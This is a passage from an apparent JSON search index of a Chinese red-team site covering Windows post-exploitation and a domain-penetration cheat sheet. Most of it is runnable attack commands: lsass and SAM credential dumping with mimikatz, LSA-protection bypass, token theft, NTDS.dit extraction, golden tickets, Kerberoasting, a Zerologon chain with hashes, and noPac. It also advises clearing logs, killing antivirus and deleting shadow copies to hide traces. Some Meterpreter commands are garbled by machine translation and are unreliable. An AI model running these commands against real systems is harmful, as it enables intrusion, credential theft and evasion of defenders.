\u5217\u51fa\u5f53\u524d\u7528\u6237","title":"\u4fe1\u606f\u6536\u96c6"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#meterpreter","text":"\uff08\u5df2\u5f03\u7528\u4f46\u4ecd\u7136\u6709\u7528\uff09","title":"Meterpreter \u811a\u672c"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_22","text":"","title":"\u53d1\u5e03\u6a21\u5757"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#windows","text":"Meterpreter \u547d\u4ee4 ps \uff08\u663e\u793a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u53ca\u5176\u5173\u8054\u7684\u7528\u6237/ID \u53f7\uff09 getuid \u83b7\u53d6\u7528\u6237 ID \u83b7\u53d6pid \u83b7\u53d6\u8fdb\u7a0b ID \u83b7\u53d6\u6743\u9650 \uff08\u663e\u793a\u5f53\u524d\u6743\u9650\uff09 \u83b7\u53d6\u7cfb\u7edf \u5c1d\u8bd5\u4f7f\u7528 4 \u79cd\u65b9\u6cd5\u83b7\u53d6 SYSTEM\uff0c\u6700\u540e\u4e00\u79cd\u662f\u540d\u4e3aKitrap0d \u7684\u672c\u5730\u6f0f\u6d1e\u5229\u7528\u3002\u8fd9\u6709\u65f6\u4f1a\u88ab\u57fa\u4e8e\u4e3b\u673a\u7684 IDS \u7cfb\u7edf\u6355\u83b7\uff0c\u751a\u81f3\u5728\u6781\u5c11\u6570\u60c5\u51b5\u4e0b\u4f1a\u84dd\u5c4f\u673a\u5668\u3002 getsystem -\uff08\u76ee\u6807 getsys \u7684\u5360\u4f4d\u7b26\uff09 \u5982\u679c\u6709\u4eba\u60f3\u5728\u6211\u80fd\u505a\u5230\u4e4b\u524d\u586b\u5199\u8fd9\u4e2a \u7cfb\u7edf\u4fe1\u606f \u83b7\u53d6\u7cfb\u7edf\u4fe1\u606f \u65f6\u95f4\u6233 \u5982\u679c\u60a8\u8db3\u591f\u597d\uff0c\u8bf7\u5220\u9664/\u641e\u7838\u65f6\u95f4\u6233\uff0c\u8fd9\u4f1a\u5f04\u4e71\u5ba1\u8ba1\u5de5\u5177 \u514b\u5229\u8036\u592b \u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7 \u54c8\u5e0c\u8f6c\u50a8 \u8f6c\u50a8 SAM \u6587\u4ef6\u54c8\u5e0c\u4ee5\u4f20\u9012\u54c8\u5e0c\u6216\u7834\u89e3 \u8fc1\u79fb [pid] \u4ece\u88ab\u5229\u7528\u7684\u8fdb\u7a0b\u8f6c\u79fb\u5230\u53e6\u4e00\u4e2a\u8fdb\u7a0b \u6709\u7528\u7684 Meterpreter \u811a\u672c killav.rb\uff08\u6740\u6b7b\u6240\u6709\u9632\u75c5\u6bd2\u8fdb\u7a0b\u7684 Meterpreter \u811a\u672c\u3002\uff09 winenum.rb\uff08\u68c0\u7d22\u6709\u5173\u7cfb\u7edf\u7684\u5404\u79cd\u4fe1\u606f\uff0c\u5305\u62ec\u73af\u5883\u53d8\u91cf\u3001interfanetworkces\u3001print_line\"\u8def\u7531\u3001\u7528\u6237\u5e10\u6237\u7b49\u7b49\u3002\uff09 scraper.rb\uff08\u6536\u96c6\u7cfb\u7edf\u4fe1\u606f\uff0c\u5305\u62ec\u7f51\u7edc\u5171\u4eab\u3001\u6ce8\u518c\u8868\u914d\u7f6e\u5355\u5143\u548c\u5bc6\u7801\u54c8\u5e0c\u3002\uff09 persistence.rb\uff08\u7528\u4e8e\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u521b\u5efa\u6301\u4e45\u540e\u95e8\u7684 Meterpreter \u811a\u672c\u3002\uff09 keylogrecorder.rb\uff08\u6b64\u811a\u672c\u5c06\u542f\u52a8 Meterpreter \u952e\u76d8\u8bb0\u5f55\u5668\u5e76\u4fdd\u5b58\u6240\u6709\u952e\u3002\uff09 getgui.rb\uff08Windows \u8fdc\u7a0b\u684c\u9762\u542f\u52a8\u5668 Meterpreter \u811a\u672c\u3002\uff09 \u5982\u9700\u5b8c\u6574\u5217\u8868\uff0c\u8bf7\u53c2\u9605\uff1a http://metasploit.com/svn/framework3/trunk/scripts/meterpreter/","title":"\u53d6\u81ea WINDOWS \u5217\u8868\uff0c\u9700\u8981\u683c\u5f0f\u5316"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#meterpreter_1","text":"\u53d1\u5e03/Windows/\u6536\u96c6/smart_hashdump \u53d1\u5e03/Windows/\u6536\u96c6/\u51ed\u636e/vnc post/windows/escalate/bypassuac\uff08\u6df7\u5408\u7ed3\u679c\uff09","title":"\u6709\u7528\u7684 Meterpreter \u5e16\u5b50\u6a21\u5757"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_23","text":"\"Pass The Hash\" \u653b\u51fb\uff08\u901a\u8fc7\u7a83\u53d6\u7684\u54c8\u5e0c\u8bbf\u95ee\u5176\u4ed6\u8ba1\u7b97\u673a\uff0c\u4e0d\u6d89\u53ca\u7834\u89e3\uff09 \u901a\u8fc7\u9690\u8eab\u65b9\u5f0f\u6a21\u62df\u4ee4\u724c \u4f7f\u7528\u9690\u8eab list_tokens -u impersonate_token -> http://www.offensive-security.com/metasploit-unleashed/Fun_With_Incognito # \u5c06 Metasploit \u7684 MSCACHE \u8f93\u51fa\u8f6c\u6362\u4e3a Hashcat \u7248\u672c\uff08\u5728 ~/.msf4/loot/ \u4e2d\u6267\u884c\uff09\uff1a \u732b *mscache* | awk -F \\'\\\"\\' \\'{\u6253\u5370 $4\\\":\\\"$2}\\'","title":"\u6709\u7528\u7684\u591a\u6b65\u9aa4\u6280\u672f"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/","text":"\u57df\u6e17\u900f\u4e00\u6761\u9f99\u624b\u518c 0R@NGE 2022-01-26 \u5185\u7f51 \u5185\u7f51\u6e17\u900f , \u57df\u6e17\u900f 1.\u65e0\u51ed\u8bc1\u60c5\u51b5\u4e0b \u00b6 \u7f51\u7edc\u626b\u63cf \u00b6 cme smb <ip_range> # SMB \u626b\u63cf\u5b58\u6d3b\u4e3b\u673a nmap -sP -p <ip> # ping \u626b\u63cf nmap -PN -sV --top-ports 50 --open <ip> # \u5feb\u901f\u626b\u63cf nmap -PN --script smb-vuln* -p139,445 <ip> # \u68c0\u6d4b SMB \u6f0f\u6d1e nmap -PN -sC -sV <ip> # \u7ecf\u5178\u626b\u63cf nmap -PN -sC -sV -p- <ip> # \u5168\u626b\u63cf nmap -sU -sC -sV <ip> # UDP \u626b\u63cf \u6f0f\u6d1e\u5feb\u901f\u63a2\u6d4b \u00b6 \u626b\u63cf\u540e\u53ef\u4ee5\u53bb\u5148\u7528\u5df2\u77e5\u6f0f\u6d1e\u6253 java rmi\uff1a exploit/multi/misc/java_rmi_server ms17-010\uff1aexploit/windows/smb/ms17_010_eternalblue tomcat\uff1aauxiliary/scanner/http/tomcat_enum jboss manager\uff1aexploit/multi/http/tomcat_mgr_deploy Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6d4b\u8bd5\uff1aysoserial \u67e5\u627e\u4ea7\u54c1\u7684CVE\u6f0f\u6d1e\uff1asearchsploit MS14-025\uff1a searchsploit findstr /S /I cpassword \\\\<FQDN>\\sysvol\\<FQDN>\\policies\\*.xml \u7206\u7834\u6570\u636e\u5e93\u8fde\u63a5\uff1ause admin/mssql/mssql_enum_sql_logins proxylogon\uff1a proxyshell\uff1a \u63d0\u6743 \u00b6 \u4f4e\u6743\u9650\u53ef\u4ee5\u505a\u7684\u4e8b\u60c5 winpeas.exe \u67e5\u627e\u5185\u5bb9\u6709 password \u7684\u6587\u4ef6\uff1afindstr /si 'password' *.txt *.xml *.docx Juicy Potato / Lovely Potato PrintSpoofer RoguePotato SMBGhost CVE-2020-0796 CVE-2021-36934 (HiveNightmare/SeriousSAM) ...... \u62e5\u6709\u672c\u5730\u7ba1\u7406\u5458\u6743\u9650 \u00b6 \u83b7\u53d6\u5bc6\u7801 \u00b6 procdump.exe -accepteula -ma lsass.exe lsass.dmp mimikatz \"privilege::debug\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords\" \"exit\" mimikatz \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\" hashdump: post/windows/gather/smart_hashdump cme smb <ip_range> -u <user> -p <password> -M lsassy cme smb <ip_range> -u <user> -p '<password>' --sam / --lsa / --ntds \u7ed5\u8fc7LSA\u9632\u62a4\u7b56\u7565\u8bfb\u53d6\u5bc6\u7801 \u00b6 PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp mimikatz \"!+\" \"!processprotect /process:lsass.exe /remove\" \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"!processprotect /process:lsass.exe\" \"!-\" #with mimidriver.sys token\u7a83\u53d6 \u00b6 .\\incognito.exe list_tokens -u .\\incognito.exe execute -c \"<domain>\\<user>\" powershell.exe use incognito impersonate_token <domain>\\\\<user> \u4e4b\u524d\u7c97\u7565\u5206\u6790\u8fc7 token Token\u7a83\u53d6\u90a3\u4e9b\u4e8b (0range-x.github.io) \u67e5\u770b\u672c\u5730\u5b58\u50a8\u7684\u6240\u6709\u5bc6\u7801 \u00b6 lazagne.exe all \u5377\u5f71\u62f7\u8d1d\uff08\u83b7\u53d6\u57df\u63a7\u6240\u6709hash\uff09 \u00b6 diskshadow list shadows all mklink /d c:\\shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\ \u7ba1\u7406\u5458\u6743\u9650\u6267\u884c vssadmin create shadow /for=C: \u5229\u7528\u5377\u5f71\u526f\u672c\u5377\u540d\u62f7\u8d1dntds.dit\u6587\u4ef6\u4e0e\u7528\u6ce8\u518c\u8868\u5bfc\u51fasystem.hive copy \\\\?\\GLOBALLROOT\\Device\\xxxxxxxxxx\\windows\\ntds\\ntds.dit C:\\ntds.dit reg sava hklm\\system system.hive //\u5bfc\u51fasystem.hive\u6587\u4ef6\u5230\u6ce8\u518c\u8868 vssadmin delete shadows /for=C: /quiet //\u5220\u9664\u5377\u5f71\uff0c\u9690\u85cf\u75d5\u8ff9 CVE-2020-1472\u7684\u5206\u6790\u4e0e\u590d\u73b0 (0range-x.github.io) dpapi\u89e3\u5bc6 \u00b6 2.\u5185\u7f51\u4fe1\u606f\u6536\u96c6 \u00b6 \u672c\u673a\u4fe1\u606f\u6536\u96c6 \u00b6 1\u3001\u7528\u6237\u5217\u8868 net user /domain windows\u7528\u6237\u5217\u8868 \u5206\u6790\u90ae\u4ef6\u7528\u6237\uff0c\u5185\u7f51[\u57df]\u90ae\u4ef6\u7528\u6237\uff0c\u901a\u5e38\u5c31\u662f\u5185\u7f51[\u57df]\u7528\u6237 2.\u8fdb\u7a0b\u5217\u8868 tasklist /svc \u5206\u6790\u6740\u6bd2\u8f6f\u4ef6/\u5b89\u5168\u76d1\u63a7\u5de5\u5177\u7b49 \u90ae\u4ef6\u5ba2\u6237\u7aef VPN ftp\u7b49 3.\u670d\u52a1\u5217\u8868 tasklist /svc \u4e0e\u5b89\u5168\u9632\u8303\u5de5\u5177\u6709\u5173\u670d\u52a1[\u5224\u65ad\u662f\u5426\u53ef\u4ee5\u624b\u52a8\u5f00\u5173\u7b49] \u5b58\u5728\u95ee\u9898\u7684\u670d\u52a1[\u6743\u9650/\u6f0f\u6d1e] 4.\u7aef\u53e3\u5217\u8868 netstat -ano \u5f00\u653e\u7aef\u53e3\u5bf9\u5e94\u7684\u5e38\u89c1\u670d\u52a1/\u5e94\u7528\u7a0b\u5e8f[\u533f\u540d/\u6743\u9650/\u6f0f\u6d1e\u7b49] \u5229\u7528\u7aef\u53e3\u8fdb\u884c\u4fe1\u606f\u6536\u96c6 5.\u8865\u4e01\u5217\u8868 systeminfo \u5206\u6790 Windows \u8865\u4e01 \u7b2c\u4e09\u65b9\u8f6f\u4ef6[Java/Oracle/Flash \u7b49]\u6f0f\u6d1e 6.\u672c\u673a\u5171\u4eab smbclient -L ip net user \\\\ip\\c$ \u672c\u673a\u5171\u4eab\u5217\u8868/\u8bbf\u95ee\u6743\u9650 \u672c\u673a\u8bbf\u95ee\u7684\u57df\u5171\u4eab/\u8bbf\u95ee\u6743\u9650 7.\u672c\u7528\u6237\u4e60\u60ef\u5206\u6790 \u5386\u53f2\u8bb0\u5f55 \u6536\u85cf\u5939 \u6587\u6863\u7b49 8.\u83b7\u53d6\u5f53\u524d\u7528\u6237\u5bc6\u7801 \u00b6 Windows \u00b6 mimikatz Invoke-WCMDump mimiDbg LaZagne NirLauncher ) quarkspwdump Linux \u00b6 mimipenguin LaZagne \u6d4f\u89c8\u5668 \u00b6 HackBrowserData SharpWeb SharpDPAPI 360SafeBrowsergetpass BrowserGhost Browser-cookie-steal(\u7a83\u53d6\u6d4f\u89c8\u5668cookie) Navicat\u5bc6\u7801 \u00b6 \u7248\u672c\uff1aNavicat 11\u621612 \u65b9\u6cd5\uff1a https://blog.csdn.net/CCESARE/article/details/104746596 \u89e3\u5bc6\u811a\u672c\uff1a https://github.com/tianhe1986/FatSmallTools https://github.com/HyperSine/how-does-navicat-encrypt-password xshell&xftp\u5bc6\u7801 \u00b6 https://github.com/dzxs/Xdecrypt mRemoteNG\u5bc6\u7801 \u00b6 https://github.com/kmahyyg/mremoteng-decrypt https://github.com/haseebT/mRemoteNG-Decrypt \u6269\u6563\u4fe1\u606f\u6536\u96c6 \u00b6 \u5e38\u7528\u7aef\u53e3\u626b\u63cf\u5de5\u5177 \u00b6 nmap masscan zmap s\u626b\u63cf\u5668 \u81ea\u5199\u811a\u672c nc \u2026\u2026 \u5185\u7f51\u62d3\u6251\u67b6\u6784\u5206\u6790 \u00b6 DMZ \u7ba1\u7406\u7f51 \u751f\u4ea7\u7f51 \u6d4b\u8bd5\u7f51 \u5e38\u89c1\u4fe1\u606f\u6536\u96c6\u547d\u4ee4 \u00b6 ipconfig\uff1a ipconfig /all ------> \u67e5\u8be2\u672c\u673a IP \u6bb5\uff0c\u6240\u5728\u57df\u7b49 net net user ------> \u672c\u673a\u7528\u6237\u5217\u8868 net localgroup administrators ------> \u672c\u673a\u7ba1\u7406\u5458[\u901a\u5e38\u542b\u6709\u57df\u7528\u6237] net user /domain ------> \u67e5\u8be2\u57df\u7528\u6237 net group /domain ------> \u67e5\u8be2\u57df\u91cc\u9762\u7684\u5de5\u4f5c\u7ec4 net group \"domain admins\" /domain ------> \u67e5\u8be2\u57df\u7ba1\u7406\u5458\u7528\u6237\u7ec4 net localgroup administrators /domain ------> \u767b\u5f55\u672c\u673a\u7684\u57df\u7ba1\u7406\u5458 net localgroup administrators workgroup\\user001 /add ----->\u57df\u7528\u6237\u6dfb\u52a0\u5230\u672c\u673a net group \"Domain controllers\" -------> \u67e5\u770b\u57df\u63a7\u5236\u5668(\u5982\u679c\u6709\u591a\u53f0) net view ------> \u67e5\u8be2\u540c\u4e00\u57df\u5185\u673a\u5668\u5217\u8868 net view /domain ------> \u67e5\u8be2\u57df\u5217\u8868 net view /domain:domainname dsquery dsquery computer domainroot -limit 65535 && net group \"domain computers\" /domain ------> \u5217\u51fa\u8be5\u57df\u5185\u6240\u6709\u673a\u5668\u540d dsquery user domainroot -limit 65535 && net user /domain------>\u5217\u51fa\u8be5\u57df\u5185\u6240\u6709\u7528\u6237\u540d dsquery subnet ------>\u5217\u51fa\u8be5\u57df\u5185\u7f51\u6bb5\u5212\u5206 dsquery group && net group /domain ------>\u5217\u51fa\u8be5\u57df\u5185\u5206\u7ec4 dsquery ou ------>\u5217\u51fa\u8be5\u57df\u5185\u7ec4\u7ec7\u5355\u4f4d dsquery server && net time /domain------>\u5217\u51fa\u8be5\u57df\u5185\u57df\u63a7\u5236\u5668 \u7b2c\u4e09\u65b9\u4fe1\u606f\u6536\u96c6 \u00b6 NETBIOS \u4fe1\u606f\u6536\u96c6 SMB \u4fe1\u606f\u6536\u96c6 \u7a7a\u4f1a\u8bdd\u4fe1\u606f\u6536\u96c6 \u6f0f\u6d1e\u4fe1\u606f\u6536\u96c6\u7b49 3.\u83b7\u53d6\u57df\u63a7\u7684\u65b9\u6cd5 \u00b6 SYSVOL \u00b6 SYSVOL\u662f\u6307\u5b58\u50a8\u57df\u516c\u5171\u6587\u4ef6\u670d\u52a1\u5668\u526f\u672c\u7684\u5171\u4eab\u6587\u4ef6\u5939\uff0c\u5b83\u4eec\u5728\u57df\u4e2d\u6240\u6709\u7684\u57df\u63a7\u5236\u5668\u4e4b\u95f4\u590d\u5236\u3002 Sysvol\u6587\u4ef6\u5939\u662f\u5b89\u88c5AD\u65f6\u521b\u5efa\u7684\uff0c\u5b83\u7528\u6765\u5b58\u653eGPO\u3001Script\u7b49\u4fe1\u606f\u3002\u540c\u65f6\uff0c\u5b58\u653e\u5728Sysvol\u6587\u4ef6\u5939\u4e2d\u7684\u4fe1\u606f\uff0c\u4f1a\u590d\u5236\u5230\u57df\u4e2d\u6240\u6709DC\u4e0a\u3002 \u76f8\u5173\u9605\u8bfb: \u5bfb\u627eSYSVOL\u91cc\u7684\u5bc6\u7801\u548c\u653b\u51fbGPP\uff08\u7ec4\u7b56\u7565\u504f\u597d\uff09 Windows Server 2008 R2\u4e4b\u56db\u7ba1\u7406Sysvol\u6587\u4ef6\u5939 SYSVOL\u4e2d\u67e5\u627e\u5bc6\u7801\u5e76\u5229\u7528\u7ec4\u7b56\u7565\u9996\u9009\u9879 \u5229\u7528SYSVOL\u8fd8\u539f\u7ec4\u7b56\u7565\u4e2d\u4fdd\u5b58\u7684\u5bc6\u7801 MS14-068 Kerberos \u00b6 python ms14-068.py -u \u57df\u7528\u6237@\u57df\u540d -p \u5bc6\u7801 -s \u7528\u6237SID -d \u57df\u4e3b\u673a \u5229\u7528mimikatz\u5c06\u5de5\u5177\u5f97\u5230\u7684 TGT_domainuser@SERVER.COM.ccache \u5199\u5165\u5185\u5b58\uff0c\u521b\u5efa\u7f13\u5b58\u8bc1\u4e66\uff1a mimikatz.exe \"kerberos::ptc c:TGT_darthsidious@pentest.com.ccache\" exit net use k: \\pentest.comc$ \u76f8\u5173\u9605\u8bfb : Kerberos\u7684\u5de5\u5177\u5305PyKEK \u6df1\u5165\u89e3\u8bfbMS14-068\u6f0f\u6d1e Kerberos\u7684\u5b89\u5168\u6f0f\u6d1e SPN\u626b\u63cf \u00b6 Kerberoast\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u6709\u6548\u7684\u65b9\u6cd5\u4eceActive Directory\u4e2d\u4ee5\u666e\u901a\u7528\u6237\u7684\u8eab\u4efd\u63d0\u53d6\u670d\u52a1\u5e10\u6237\u51ed\u636e\uff0c\u65e0\u9700\u5411\u76ee\u6807\u7cfb\u7edf\u53d1\u9001\u4efb\u4f55\u6570\u636e\u5305\u3002 SPN\u662f\u670d\u52a1\u5728\u4f7f\u7528Kerberos\u8eab\u4efd\u9a8c\u8bc1\u7684\u7f51\u7edc\u4e0a\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u3002\u5b83\u7531\u670d\u52a1\u7c7b\uff0c\u4e3b\u673a\u540d\u548c\u7aef\u53e3\u7ec4\u6210\u3002\u5728\u4f7f\u7528Kerberos\u8eab\u4efd\u9a8c\u8bc1\u7684\u7f51\u7edc\u4e2d\uff0c\u5fc5\u987b\u5728\u5185\u7f6e\u8ba1\u7b97\u673a\u5e10\u6237\uff08\u5982NetworkService\u6216LocalSystem\uff09\u6216\u7528\u6237\u5e10\u6237\u4e0b\u4e3a\u670d\u52a1\u5668\u6ce8\u518cSPN\u3002\u5bf9\u4e8e\u5185\u90e8\u5e10\u6237\uff0cSPN\u5c06\u81ea\u52a8\u8fdb\u884c\u6ce8\u518c\u3002\u4f46\u662f\uff0c\u5982\u679c\u5728\u57df\u7528\u6237\u5e10\u6237\u4e0b\u8fd0\u884c\u670d\u52a1\uff0c\u5219\u5fc5\u987b\u4e3a\u8981\u4f7f\u7528\u7684\u5e10\u6237\u7684\u624b\u52a8\u6ce8\u518cSPN\u3002 SPN\u626b\u63cf\u7684\u4e3b\u8981\u597d\u5904\u662f\uff0cSPN\u626b\u63cf\u4e0d\u9700\u8981\u8fde\u63a5\u5230\u7f51\u7edc\u4e0a\u7684\u6bcf\u4e2aIP\u6765\u68c0\u67e5\u670d\u52a1\u7aef\u53e3\uff0cSPN\u901a\u8fc7LDAP\u67e5\u8be2\u5411\u57df\u63a7\u6267\u884c\u670d\u52a1\u53d1\u73b0\uff0cSPN\u67e5\u8be2\u662fKerberos\u7684\u7968\u636e\u884c\u4e3a\u4e00\u90e8\u5206\uff0c\u56e0\u6b64\u6bd4\u8f83\u96be\u68c0\u6d4bSPN\u626b\u63cf\u3002 \u76f8\u5173\u9605\u8bfb : \u975e\u626b\u63cf\u5f0f\u7684SQL Server\u53d1\u73b0 SPN\u626b\u63cf \u626b\u63cfSQLServer\u7684\u811a\u672c Kerberos\u7684\u9ec4\u91d1\u95e8\u7968 \u00b6 \u5728\u57df\u4e0a\u6293\u53d6\u7684\u54c8\u5e0c lsadump::dcsync /domain:pentest.com /user:krbtgt kerberos::purge kerberos::golden /admin:administrator /domain:\u57df /sid:SID /krbtgt:hash\u503c /ticket:adinistrator.kiribi kerberos::ptt administrator.kiribi kerberos::tgt net use k: \\pnet use k: \\pentest.comc$ \u76f8\u5173\u9605\u8bfb : https://adsecurity.org/?p=1640 \u57df\u670d\u52a1\u8d26\u53f7\u7834\u89e3\u5b9e\u8df5 Kerberos\u7684\u8ba4\u8bc1\u539f\u7406 \u6df1\u523b\u7406\u89e3windows\u5b89\u5168\u8ba4\u8bc1\u673a\u5236ntlm\uff06Kerberos Kerberos\u7684\u94f6\u7968\u52a1 \u00b6 \u9ec4\u91d1\u7968\u636e\u548c\u767d\u94f6\u7968\u636e\u7684\u4e00\u4e9b\u533a\u522b\uff1a Golden Ticket\uff1a\u4f2a\u9020 TGT \uff0c\u53ef\u4ee5\u83b7\u53d6 \u4efb\u4f55Kerberos \u670d\u52a1\u6743\u9650 \u94f6\u7968\uff1a\u4f2a\u9020TGS\uff0c \u53ea\u80fd\u8bbf\u95ee\u6307\u5b9a\u7684\u670d\u52a1 \u52a0\u5bc6\u65b9\u5f0f\u4e0d\u540c\uff1a Golden Ticket\u7531 krbtgt \u7684hash\u52a0\u5bc6 Silver Ticket\u7531 \u670d\u52a1\u8d26\u53f7 \uff08\u901a\u5e38\u4e3a\u8ba1\u7b97\u673a\u8d26\u6237\uff09Hash\u52a0\u5bc6 \u8ba4\u8bc1\u6d41\u7a0b\u4e0d\u540c\uff1a \u91d1\u7968\u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u9700\u8981\u540c\u57df\u63a7\u901a\u4fe1 \u94f6\u7968\u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e0d\u9700\u8981\u540c\u57df\u63a7\u901a\u4fe1 \u76f8\u5173\u9605\u8bfb : \u653b\u51fb\u8005\u5982\u4f55\u4f7f\u7528Kerberos\u7684\u94f6\u7968\u6765\u5229\u7528\u7cfb\u7edf \u57df\u6e17\u900f\u2014\u2014Pass The Ticket \u57df\u670d\u52a1\u8d26\u53f7\u7834\u89e3 \u00b6 \u4e0e\u4e0a\u9762SPN\u626b\u63cf\u7c7b\u4f3c\u7684\u539f\u7406 https://github.com/nidem/kerberoast \u83b7\u53d6\u6240\u6709\u7528\u4f5cSPN\u7684\u5e10\u6237 setspn -T PENTEST.com -Q */* \u4eceMimikatz\u7684RAM\u4e2d\u63d0\u53d6\u83b7\u5f97\u7684\u95e8\u7968 kerberos::list /export \u7528rgsrepcrack\u7834\u89e3 tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi \u51ed\u8bc1\u76d7\u7a83 \u00b6 \u4ece\u641c\u96c6\u7684\u5bc6\u7801\u91cc\u9762\u627e\u7ba1\u7406\u5458\u7684\u5bc6\u7801 NTLM relay \u00b6 One API call away from Domain Admin privexchange Exchange2domain \u7528\u4e8e\u4e3b\u52a8\u8ba9\u76ee\u6807\u673a\u5668\u53d1\u8d77NTLM\u8bf7\u6c42\u7684\u65b9\u6cd5\uff1a printerbug PetitPotam Relay LDAP: CVE-2019-1040-dcpwn Relay AD CS/PKI: AD CS/PKI template exploit \u96c6\u6210\u51e0\u4e2a\u5229\u7528\u7684\u5de5\u5177\uff1a Relayx \u5185\u7f51445\u7aef\u53e3\u8f6c\u53d1\uff1a PortBender Kerberos\u59d4\u6d3e \u00b6 Wagging-the-Dog.html s4u2pwnage Attacking Kerberos Delegation \u7528\u6253\u5370\u670d\u52a1\u83b7\u53d6\u57df\u63a7 Computer Takeover Combining NTLM Relaying and Kerberos delegation CVE-2019-1040 \u5730\u5740\u89e3\u6790\u534f\u8bae \u00b6 \u5b9e\u5728\u641e\u4e0d\u5b9a\u518d\u641eARP zerologon\u6f0f\u6d1e \u00b6 python3 cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip> secretsdump.py <DOMAIN>/<MACHINE_BIOS_NAME>\\$@<IP> -no-pass -just-dc-user \"Administrator\" secretsdump.py -hashes :<HASH_admin> <DOMAIN>/Administrator@<IP> python3 restorepassword.py -target-ip <IP> <DOMAIN>/<MACHINE_BIOS_NAME>@<MACHINE_BIOS_NAME> -hexpass <HEXPASS> CVE-2020-1472\u7684\u5206\u6790\u4e0e\u590d\u73b0 (0range-x.github.io) **1\u3001\u5229\u7528Mimikatz **check lsadump::zerologon /target:dc1.exploit.local /account:dc1$ exploit lsadump::zerologon /target:dc1.exploit.local /account:dc1$ /exploit dcsync lsadump::dcsync /dc:dc1.exploit.local /authuser:dc1$ /authdomain:exploit.local /authpassword:\"\" /domain:exploit.local /authntlm /user:krbtgt restore lsadump::postzerologon /target:conttosson.locl /account:dc$ 2\u3001\u5229\u7528impacket\uff1a \u53d6\u76ee\u6807\u4e3b\u673a\u540d+IP install \u4fee\u6539\u7248\u672c\u7684impacket Exp python cve-2020-1472-exploit.py DC2008 10.211.55.200 secretsdump.py -no-pass cgdomain.com/'DC2008$'@10.211.55.200 -history -just-dc-user administrator secretsdump.py -no-pass cgdomain.com/administrator@10.211.55.200 -hashes aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae \u83b7\u53d6\u5230\u65e7\u7684\u5bc6\u7801\u660e\u6587hex\uff0c\u8fd8\u539f python restorepassword.py cgdomain.com/DC2008@DC2008 -target-ip 10.211.55.200 -hexpass 59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b \u6062\u590d\u65b9\u6cd52 \u901a\u8fc7wmic, pass the hash \u62ff\u5230\u57df\u63a7\u5236\u5668\u4e2d\u7684\u672c\u5730\u7ba1\u7406\u5458\u6743\u9650(\u57df\u7ba1) wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local/Administrator@10.211.55.38 \u7136\u540e\u5206\u522b\u6267\u884c,\u62f7\u8d1d\u672c\u673a\u4e2dSAM\u6570\u636e\u5e93\u5230\u672c\u5730 - reg save HKLM\\SYSTEM system.save - reg save HKLM\\SAM sam.save - reg save HKLM\\SECURITY security.save - get system.save - get sam.save - get security.save - del /f system.save - del /f sam.save - del /f security.save \u63d0\u53d6\u660e\u6587hash secretsdump.py -sam sam.save -system system.save -security security.save LOCAL \u7136\u540e\u6062\u590d\u3002 CVE-2021-42278 && CVE-2021-42287 \u00b6 sam-the-admin noPac: CVE-2021-42287/CVE-2021-42278 ./noPac.exe -domain dc.com -user username -pass 'password' /dc owa.dc.com /mAccount mAusername /mPassword password /service cifs /ptt 4.\u5217\u51fa\u53ef\u533f\u540d\u8bbf\u95ee\u7684SMB\u5171\u4eab \u00b6 enum4linux -a -u \"\" -p \"\" <dc-ip> && enum4linux -a -u \"guest\" -p \"\" <dc-ip> smbmap -u \"\" -p \"\" -P 445 -H <dc-ip> && smbmap -u \"guest\" -p \"\" -P 445 -H <dc-ip> smbclient -U '%' -L //<dc-ip> && smbclient -U 'guest%' -L //<dc-ip> cme smb <ip> -u '' -p '' # \u679a\u4e3e\u53ef\u7a7aSession\u8bbf\u95ee\u7684SMB\u5171\u4eab cme smb <ip> -u 'a' -p '' #\u679a\u4e3e\u53ef\u533f\u540d\u8bbf\u95ee\u7684SMB\u5171\u4eab 5.\u679a\u4e3eLDAP \u00b6 nmap -n -sV --script \"ldap* and not brute\" -p 389 <dc-ip> ldapsearch -x -h <ip> -s base 6.\u67e5\u627e\u7528\u6237\u540d \u00b6 enum4linux -U <dc-ip> | grep 'user:' crackmapexec smb <ip> -u <user> -p '<password>' --users nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm='<domain>',userdb=<users_list_file>\" <ip> OSINT - \u5728\u4e92\u8054\u7f51\u4e0a\u5bfb\u627e\u7528\u6237\u540d \u5f97\u5230\u8d26\u53f7\uff0c\u4f46\u662f\u6ca1\u6709\u5bc6\u7801 \u00b6 \u5bc6\u7801\u55b7\u6d12 \u00b6 \u83b7\u53d6\u57df\u5bc6\u7801\u7b56\u7565 \uff1a crackmapexec 